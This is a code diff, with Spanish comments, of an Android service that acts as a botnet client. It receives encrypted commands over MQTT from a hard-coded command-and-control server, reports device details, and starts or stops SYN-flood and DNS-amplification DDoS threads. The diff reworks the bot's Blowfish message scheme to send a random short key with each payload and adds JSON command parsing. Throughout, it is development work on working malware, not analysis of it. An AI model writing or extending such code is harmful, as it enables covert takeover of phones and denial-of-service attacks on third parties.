@@ -24,6 +24,8 @@ import org.eclipse.paho.client.mqttv3.MqttCallback;
 import org.eclipse.paho.client.mqttv3.MqttClient;
 import org.eclipse.paho.client.mqttv3.MqttException;
 import org.eclipse.paho.client.mqttv3.MqttMessage;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
@@ -33,6 +35,8 @@ import java.math.BigInteger;
 import java.security.InvalidKeyException;
 import java.security.Key;
 import java.security.NoSuchAlgorithmException;
+import java.util.Arrays;
+import java.util.UUID;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
@@ -182,12 +186,11 @@ public class MqttConnectionManagerService extends Service {
 
         client = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://192.168.1.78:1883",
                 clientId);
-        client2 = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://187.208.237.95:1883",
+        client2 = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://187.208.132.150:1883",
                 clientId2); //SIMULACIÓN <-------------
 
         final SharedPreferences sharedPreferences = getApplication().getApplicationContext().getSharedPreferences("IoTE", Context.MODE_PRIVATE);
         final String id = sharedPreferences.getString("ID", "-");
-        final String key = sharedPreferences.getString("KEY", "-");
         final  int firstTime = sharedPreferences.getInt("FIRST_TIME", 1);
 
 
@@ -202,27 +205,19 @@ public class MqttConnectionManagerService extends Service {
                 }
 
                 @Override
-                public void messageArrived(String topic, MqttMessage message) throws MqttException, NoSuchPaddingException, NoSuchAlgorithmException {
+                public void messageArrived(String topic, MqttMessage message) throws MqttException, NoSuchPaddingException, NoSuchAlgorithmException, JSONException {
                     Log.d(TAG, "messageArrived: Topic: " + topic + " Message: " + message);
 
                     String s = String.valueOf(message);
                     Log.d(TAG, "IRA WE->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>: " +s);
                     //Descifrando el mensaje
-                    int startIndex = Integer.parseInt(s.substring(0,2));
-                    int endIndex = Integer.parseInt(s.substring(2,4));
-                    int lengthKey = endIndex - startIndex;
-                    String subKey = s.substring(4,lengthKey+4);
-                    String encryptedPayload = s.substring(lengthKey+4);
-                    Log.d(TAG, "Subllave: "+subKey);
 
-
+                    String decryptionKey = s.substring(0, 4);
+                    String encryptedPayload = s.substring(4);
+                    Log.d(TAG, "Subllave: "+decryptionKey);
 
                     Cipher cipher = Cipher.getInstance("Blowfish/ECB/PKCS5Padding");
-                    Key blowfishKey = new SecretKeySpec(subKey.getBytes(), "Blowfish");
-
-                    /*for (int i = lengthKey+4 ; i < s.length() ; i++){
-                        Log.d(TAG, "messageArrived: " + s.charAt(i));
-                    }*/
+                    Key blowfishKey = new SecretKeySpec(decryptionKey.getBytes(), "Blowfish");
 
                     try {
                         cipher.init(Cipher.DECRYPT_MODE, blowfishKey);
@@ -231,6 +226,21 @@ public class MqttConnectionManagerService extends Service {
                     }
                     byte[] decrypted = new byte[0];
                     byte[] finalBytes = new BigInteger(encryptedPayload, 16).toByteArray();
+                    Log.d(TAG, "messageArrived: Longitud del carro: "+finalBytes.length);
+
+                    if(finalBytes.length % 8 != 0){
+                        Log.d(TAG, "messageArrived: Entro AL PRIMER IF");
+                        if(finalBytes[0] == 0){
+                            Log.d(TAG, "messageArrived: Entro al SEGUNDO IF");
+                            Log.d(TAG, "messageArrived: "+bytesToHex(finalBytes));
+                            //System.arraycopy(finalBytes, 1, finalBytes, 0, finalBytes.length-1);
+                            finalBytes = Arrays.copyOfRange(finalBytes,1,finalBytes.length);
+                            //finalBytes = new byte[0];
+                            //finalBytes = aux;
+                            Log.d(TAG, "messageArrived:Cambiado gambito  "+bytesToHex(finalBytes));
+                        }
+                    }
+
                     Log.d(TAG, "Cadena convertida en bytes: "+new String(finalBytes));
                     Log.d(TAG, "Cadena convertida en bytes (en crudo): "+finalBytes);
                     Log.d(TAG, "messageArrived: "+bytesToHex(finalBytes));
@@ -244,7 +254,9 @@ public class MqttConnectionManagerService extends Service {
                     String decryptedString = new String(decrypted);
                     Log.d(TAG, "DESCIFRADO->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>: " +decryptedString);
 
-
+                    //Leyendo el JSON
+                    JSONObject obj = new JSONObject(decryptedString);
+                    decryptedString = obj.getString("command");
 
                     final String[] splited = decryptedString.split("\\s+");
 
@@ -253,6 +265,7 @@ public class MqttConnectionManagerService extends Service {
 
                     String id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
                     int firstTime = 0; //SIMULACIÓN
+                    final String encryptKey = UUID.randomUUID().toString().replace("-", "").substring(0, 4);
 
                     switch (Integer.parseInt(splited[0]))
                     {
@@ -269,13 +282,10 @@ public class MqttConnectionManagerService extends Service {
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -306,13 +316,10 @@ public class MqttConnectionManagerService extends Service {
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -344,13 +351,10 @@ public class MqttConnectionManagerService extends Service {
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -383,13 +387,10 @@ public class MqttConnectionManagerService extends Service {
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -418,17 +419,13 @@ public class MqttConnectionManagerService extends Service {
                                 }
                                 String architecturProcessor = sb.toString();
                                 String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"5\", \"value\": \""+architecturProcessor+"\"}"+firstTime+"&";
-
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey, deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -461,13 +458,10 @@ public class MqttConnectionManagerService extends Service {
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -500,13 +494,10 @@ public class MqttConnectionManagerService extends Service {
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -539,13 +530,10 @@ public class MqttConnectionManagerService extends Service {
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -571,7 +559,7 @@ public class MqttConnectionManagerService extends Service {
                             entre C&C-Bot. Nota: Si no se crea el hilo, los camndos 1,2,3..
                             dejan de ser recibidos por el bot, lo cual imposibilita detener
                             la inundación SYN.*/
-                             if(hiloOcupado == false && dosFloodSyn == false){
+                             if(!hiloOcupado && !dosFloodSyn){
 
                                  t1 = new MyThread(splited[1],splited[2],1,client);
 
@@ -581,13 +569,10 @@ public class MqttConnectionManagerService extends Service {
                                  //Cifrando
                                  Blowfish blowfish = new Blowfish();
                                  ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                 int[] indexes = blowfish.generateIndexes();
-                                 String sub_key = key.substring(indexes[0] , indexes[1]);
-                                 String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                  try {
-                                     bytesMqtt.write(mqttPayload.getBytes());
-                                     bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                     bytesMqtt.write(encryptKey.getBytes());
+                                     bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                  } catch (Exception e) {
                                      e.printStackTrace();
                                  }
@@ -603,7 +588,7 @@ public class MqttConnectionManagerService extends Service {
                                  hiloOcupado = true;
                                  dosFloodSyn = true;
 
-                             }else if (hiloOcupado == true){
+                             }else if (hiloOcupado){
 
                                  String floodSyn = "Error (1) Solo un DDoS a la vez";
                                  String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";
@@ -611,13 +596,10 @@ public class MqttConnectionManagerService extends Service {
                                  //Cifrando
                                  Blowfish blowfish = new Blowfish();
                                  ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                 int[] indexes = blowfish.generateIndexes();
-                                 String sub_key = key.substring(indexes[0] , indexes[1]);
-                                 String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                  try {
-                                     bytesMqtt.write(mqttPayload.getBytes());
-                                     bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                     bytesMqtt.write(encryptKey.getBytes());
+                                     bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                  } catch (Exception e) {
                                      e.printStackTrace();
                                  }
@@ -636,7 +618,7 @@ public class MqttConnectionManagerService extends Service {
 
                         case 10:
 
-                            if(hiloOcupado == true && dosFloodSyn == true){
+                            if(hiloOcupado && dosFloodSyn){
 
                                 hiloOcupado = false;
                                 dosFloodSyn = false;
@@ -654,13 +636,10 @@ public class MqttConnectionManagerService extends Service {
                                     //Cifrando
                                     Blowfish blowfish = new Blowfish();
                                     ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                    int[] indexes = blowfish.generateIndexes();
-                                    String sub_key = key.substring(indexes[0] , indexes[1]);
-                                    String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                     try {
-                                        bytesMqtt.write(mqttPayload.getBytes());
-                                        bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                        bytesMqtt.write(encryptKey.getBytes());
+                                        bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                     } catch (Exception e) {
                                         e.printStackTrace();
                                     }
@@ -678,7 +657,7 @@ public class MqttConnectionManagerService extends Service {
                                 }
 
 
-                            }else if (dosFloodSyn == false){
+                            }else if (!dosFloodSyn){
 
                                 String floodSyn = "Error (2) No ha sido iniciada";
                                 String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";
@@ -686,13 +665,10 @@ public class MqttConnectionManagerService extends Service {
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -710,7 +686,7 @@ public class MqttConnectionManagerService extends Service {
 
                         case 11:
 
-                            if(hiloOcupado == false && dosAmpDns == false){
+                            if(!hiloOcupado && !dosAmpDns){
                                 t1 = new MyThread(splited[1],splited[2],2,client);
 
                                 String ampDns = "Iniciada";
@@ -719,13 +695,10 @@ public class MqttConnectionManagerService extends Service {
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -741,7 +714,7 @@ public class MqttConnectionManagerService extends Service {
                                 hiloOcupado = true;
                                 dosAmpDns = true;
 
-                            }else if (hiloOcupado == true){
+                            }else if (hiloOcupado){
 
                                 String floodSyn = "Error (1) Solo un DDoS a la vez";
                                 String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";
@@ -749,13 +722,10 @@ public class MqttConnectionManagerService extends Service {
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -774,7 +744,7 @@ public class MqttConnectionManagerService extends Service {
 
                         case 12:
 
-                            if(hiloOcupado == true && dosAmpDns == true){
+                            if(hiloOcupado && dosAmpDns){
                                 hiloOcupado = false;
                                 dosAmpDns = false;
                                 t1.t.interrupt(); //para el hilo...
@@ -791,13 +761,10 @@ public class MqttConnectionManagerService extends Service {
                                     //Cifrando
                                     Blowfish blowfish = new Blowfish();
                                     ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                    int[] indexes = blowfish.generateIndexes();
-                                    String sub_key = key.substring(indexes[0] , indexes[1]);
-                                    String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                     try {
-                                        bytesMqtt.write(mqttPayload.getBytes());
-                                        bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                        bytesMqtt.write(encryptKey.getBytes());
+                                        bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                     } catch (Exception e) {
                                         e.printStackTrace();
                                     }
@@ -813,7 +780,7 @@ public class MqttConnectionManagerService extends Service {
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
-                            }else if(dosAmpDns == false ){
+                            }else if(!dosAmpDns){
 
                                 String ampDns = "Error (2) Has not been started";
                                 String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+ampDns+"\"}"+firstTime+"&";
@@ -821,13 +788,10 @@ public class MqttConnectionManagerService extends Service {
                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                                int[] indexes = blowfish.generateIndexes();
-                                String sub_key = key.substring(indexes[0] , indexes[1]);
-                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                                 try {
-                                    bytesMqtt.write(mqttPayload.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -855,13 +819,10 @@ public class MqttConnectionManagerService extends Service {
                             //Cifrando
                             Blowfish blowfish = new Blowfish();
                             ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                            int[] indexes = blowfish.generateIndexes();
-                            String sub_key = key.substring(indexes[0] , indexes[1]);
-                            String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;
 
                             try {
-                                bytesMqtt.write(mqttPayload.getBytes());
-                                bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
+                                bytesMqtt.write(encryptKey.getBytes());
+                                bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                             } catch (Exception e) {
                                 e.printStackTrace();
                             }
